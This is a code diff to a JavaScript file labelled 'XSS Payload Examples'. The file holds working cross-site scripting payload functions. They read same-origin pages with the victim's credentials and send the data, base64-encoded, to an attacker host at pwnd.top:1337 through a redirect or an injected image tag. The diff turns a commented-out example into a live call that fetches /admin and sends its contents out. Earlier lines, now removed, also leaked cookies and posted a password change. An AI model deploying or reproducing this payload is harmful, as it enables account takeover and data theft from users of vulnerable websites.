@@ -2,11 +2,11 @@
  *  XSS Payload Examples
 */
 // exfil data
-function leak2(data) {
-    window.open("http://pwnd.top/"+btoa(data));
-}
 function leak(data) {
-    document.write('<img src="http://pwnd.top/'+btoa(data)+'">');
+    document.location = "http://pwnd.top:1337/"+btoa(data);
+}
+function leak2(data) {
+    document.write('<img src="http://pwnd.top:1337/'+btoa(data)+'">');
 }
 
 // get same origin page contents and exfil
@@ -26,10 +26,7 @@ function getPageAJAX(page) {
 // get page via fetch (full url or local page)
 function getPageFetch(url) {
 	return fetch(url, {
-        method: "GET",
-        headers: {
-          "Referrer": "/profile"
-        },
+    method: "GET",
 	mode: "no-cors",
 	credentials: "include",
     }).then(resp => resp.text())
@@ -55,12 +52,8 @@ function postPageFetch(url, data) {
         })
 }
 
-// Examples
-/*
-async function run() {
-    leak(document.cookie);
-    leak(await getPageFetch('/admin'));
-    leak( await postPageFetch('/admin', '["password":"hacked"]'));
+async function main() {
+ 	leak(await getPageFetch('/admin'));
+ 	//console.log(await getPageFetch('/'));
 }
-run();
-*/
+main();
